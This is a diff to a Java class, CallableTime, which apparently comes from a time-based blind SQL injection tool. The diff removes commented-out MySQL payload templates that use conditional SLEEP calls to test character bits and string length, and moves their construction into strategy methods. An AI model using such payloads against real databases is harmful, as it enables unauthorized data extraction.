@@ -30,7 +30,6 @@ public class CallableTime extends CallableAbstractBlind<CallableTime> {
      * @param inj
      */
     public CallableTime(String inj) {
-//        this.blindUrl = "+and+if(" + inj + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
         this.blindUrl = MediatorModel.model().sqlStrategy.timeCheck(inj);
     }
     
@@ -41,14 +40,12 @@ public class CallableTime extends CallableAbstractBlind<CallableTime> {
      * @param bit
      */
     public CallableTime(String inj, int indexCharacter, int bit) {
-//        this.blindUrl = "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
         this.blindUrl = MediatorModel.model().sqlStrategy.timeBitTest(inj, indexCharacter, bit);
         this.currentIndex = indexCharacter;
         this.currentBit = bit;
     }
 
     public CallableTime(String inj, int indexCharacter, boolean isLengthTest) {
-//        this.blindUrl = "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
         this.blindUrl = MediatorModel.model().sqlStrategy.timeLengthTest(inj, indexCharacter);
         this.isLengthTest = isLengthTest;
     }
